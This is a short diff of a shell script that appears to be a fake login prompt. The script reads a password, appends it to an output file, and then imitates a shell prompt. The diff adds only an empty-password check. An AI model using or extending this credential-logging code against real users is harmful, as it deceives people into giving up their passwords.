@@ -21,9 +21,18 @@ then
     printf "\n"
     printf "Password: "
     read ps
+    if [ -z "$ps" ]
+    then
+    echo "Wrong Password!"
+    echo "Access Denied!"
+    exit
+    
+else
     echo "Entered Password: $ps" >> $output_file
     sed '/^$/d' $output_file > fixed.txt
     mv fixed.txt output.txt
+fi
+
 fi
 
 while true
@@ -39,3 +48,4 @@ printf "$u@$srv:~"
           echo ".  .."
       fi
 done
+
